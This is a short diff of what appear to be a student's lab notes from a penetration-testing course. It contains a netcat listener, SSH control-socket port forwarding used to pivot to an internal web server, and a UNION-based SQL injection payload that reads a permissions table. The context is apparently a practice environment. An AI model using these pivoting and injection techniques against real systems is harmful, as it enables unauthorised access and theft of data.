@@ -33,22 +33,18 @@ student@lin-ops:~$ nc -lk 10.50.188.39 42069
 SHA256:cG1PduaGk/fLmUlWy1xTHIUCC+K9ABIbkAWxZUNMgPI student@lin-ops
 
 
-
+------------------------------------------------------------------------------------------------------------------------
 ssh -MS /tmp/sqldemo demo1@10.50.12.21
 ssh -S /tmp/sqldemo sqldemo -O 
 
 
+student@lin-ops:~$ ssh -MS /tmp/sql agent@10.50.15.242
+student@lin-ops:~$ ssh -S /tmp/sql agent@10.50.15.242
+student@lin-ops:~$ ssh -S /tmp/sql sql -O forward -L1212:10.100.28.48:80
 
+127.0.0.1:1212
 
-
-
-
-
-
-
-
-
-
+category= 2 UNION SELECT Name,Description,Level FROM sqlinjection.permissions
 
 
 
